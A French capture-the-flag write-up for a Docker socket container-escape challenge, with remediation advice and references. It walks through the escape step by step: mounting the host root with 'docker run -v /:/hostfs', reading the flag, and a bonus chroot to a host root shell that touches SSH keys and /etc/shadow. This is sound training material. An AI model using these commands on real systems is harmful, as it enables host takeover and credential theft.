# Writeup — Container Escape via Docker Socket

**Catégorie** : Linux / Privilege Escalation  
**Difficulté** : Hard  
**Points** : 500  
**Flag** : `CTF{docker_socket_escape_to_host}`

## Contexte

Le socket Unix Docker (`/var/run/docker.sock`) est l'interface de communication avec le démon Docker. Monter ce socket à l'intérieur d'un container donne au container un contrôle complet sur le démon Docker du host. Un attaquant peut l'exploiter pour créer un nouveau container avec le filesystem du host monté en lecture/écriture, lui permettant d'accéder à n'importe quel fichier sur le host — y compris des secrets, des clés SSH, des credentials, et des flags CTF. Le flag de ce challenge n'est pas dans le container, mais sur la machine hôte.

## Prérequis pour les organisateurs

Créer le flag sur la machine hôte (VM Vagrant) avant de lancer le challenge :

```bash
sudo mkdir -p /opt/ctf-flags
echo 'CTF{docker_socket_escape_to_host}' | sudo tee /opt/ctf-flags/container-escape.txt
sudo chmod 644 /opt/ctf-flags/container-escape.txt
```

## Connexion

```bash
ssh player@<TARGET_IP> -p 5025
# password: player2026
```

## Étapes de résolution

### 1. Énumération initiale

À la connexion, on commence par explorer l'environnement :

```bash
player@container:~$ id
uid=1000(player) gid=1000(player) groups=1000(player),999(docker)
```

L'utilisateur appartient au groupe `docker` — indice fort.

```bash
player@container:~$ ls -la /var/run/
total 8
drwxr-xr-x 1 root root   26 Jan  1 00:00 .
drwxr-xr-x 1 root root  100 Jan  1 00:00 ..
srw-rw---- 1 root docker  0 Jan  1 00:00 docker.sock    <-- CIBLE
```

`/var/run/docker.sock` est présent et accessible au groupe `docker` (dont `player` fait partie).

On peut aussi vérifier qu'on est dans un container :

```bash
player@container:~$ cat /proc/1/cgroup
# Contient des références à docker

player@container:~$ ls /.dockerenv
/.dockerenv    # Fichier présent dans les containers Docker
```

### 2. Identification de la vulnérabilité

Le socket Docker monté dans le container donne accès au démon Docker du host. Cela permet de :
- Lister les containers en cours d'exécution sur le host
- Lancer de nouveaux containers avec n'importe quelle configuration
- Monter le filesystem du host dans un container et y accéder

```bash
player@container:~$ docker ps
CONTAINER ID   IMAGE              COMMAND                  CREATED          STATUS          PORTS                  NAMES
a1b2c3d4e5f6   container-escape   "/usr/sbin/sshd -D -…"   5 minutes ago    Up 5 minutes    0.0.0.0:5025->22/tcp   ctf-container-escape
b2c3d4e5f6a7   suid-classic       "/usr/sbin/sshd -D -…"   10 minutes ago   Up 10 minutes   0.0.0.0:5020->22/tcp   ctf-suid-classic
```

La commande `docker ps` fonctionne, confirmant l'accès au démon Docker du host.

### 3. Exploitation

On lance un nouveau container qui monte la racine du filesystem du host (`/`) dans `/hostfs` :

```bash
player@container:~$ docker run -v /:/hostfs --rm -it alpine sh
```

Explication :
- `-v /:/hostfs` : monte le filesystem complet du host dans `/hostfs` à l'intérieur du nouveau container
- `--rm` : supprime le container automatiquement à la sortie
- `-it` : mode interactif avec pseudo-TTY
- `alpine` : image légère à utiliser (disponible sur Docker Hub ou en cache)
- `sh` : lance un shell dans ce nouveau container

On se retrouve dans un shell du nouveau container, mais avec accès à tout le filesystem du host :

```bash
/ # ls /hostfs/
bin   boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

On peut explorer le système host :

```bash
/ # ls /hostfs/opt/ctf-flags/
container-escape.txt
```

### 4. Récupération du flag

```bash
/ # cat /hostfs/opt/ctf-flags/container-escape.txt
CTF{docker_socket_escape_to_host}
```

**Alternative en one-liner** (sans shell interactif) :

```bash
player@container:~$ docker run -v /:/hostfs --rm alpine sh -c "cat /hostfs/opt/ctf-flags/container-escape.txt"
CTF{docker_socket_escape_to_host}
```

**Bonus — Accès root complet sur le host** :

On peut également accéder au répertoire root du host, lire les clés SSH, modifier des fichiers système, etc. :

```bash
/ # cat /hostfs/root/.ssh/authorized_keys
/ # ls /hostfs/etc/shadow
/ # chroot /hostfs /bin/bash
root@hostmachine:/#    # Shell root sur le HOST lui-même
```

## Explication de la vulnérabilité

Le socket Docker `/var/run/docker.sock` est l'API de contrôle du démon Docker. Toute entité ayant accès en écriture à ce socket peut lancer des containers avec des options arbitraires, notamment :
- `-v /:/hostfs` : accès complet au filesystem host
- `--privileged` : mode privilégié avec accès à tous les devices
- `--pid=host` : accès à l'espace de noms PID du host
- `--network=host` : accès au réseau host

Le montage du socket Docker dans un container revient à donner au container les droits root sur le host, car n'importe quel utilisateur du groupe `docker` peut créer des containers avec ce niveau d'accès.

**Impact réel** : Compromission complète de la machine hôte. Un attaquant qui s'échappe du container peut lire tous les fichiers du host, modifier des fichiers critiques (`/etc/passwd`, crontabs, binaires système), installer des backdoors persistantes, accéder à d'autres containers et leurs secrets, etc.

## Recommandations de remédiation

1. **Ne jamais monter `/var/run/docker.sock` dans un container de production** sans nécessité absolue.
2. **Si le socket Docker est nécessaire**, utiliser un proxy socket comme `tecnativa/docker-socket-proxy` qui restreint les opérations autorisées.
3. **Utiliser des alternatives** : Podman (rootless), Kaniko, ou des solutions CI/CD dédiées (Buildkite, Tekton).
4. **Activer les user namespaces Docker** pour isoler les UIDs entre host et containers.
5. **Appliquer des politiques AppArmor/SELinux** sur les containers Docker.
6. **Auditer régulièrement** les docker-compose.yml et les configurations de déploiement pour détecter les montages de socket.
7. **Utiliser des outils de scanning** comme Trivy, Falco, ou Anchore Engine pour détecter ces configurations dangereuses.

## Références

- "Docker Socket Privilege Escalation" — HackTricks : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
- MITRE ATT&CK T1611 (Escape to Host) : https://attack.mitre.org/techniques/T1611/
- Docker security documentation : https://docs.docker.com/engine/security/
- "Understanding Docker Container Escapes" — Trail of Bits : https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
- tecnativa/docker-socket-proxy : https://github.com/Tecnativa/docker-socket-proxy
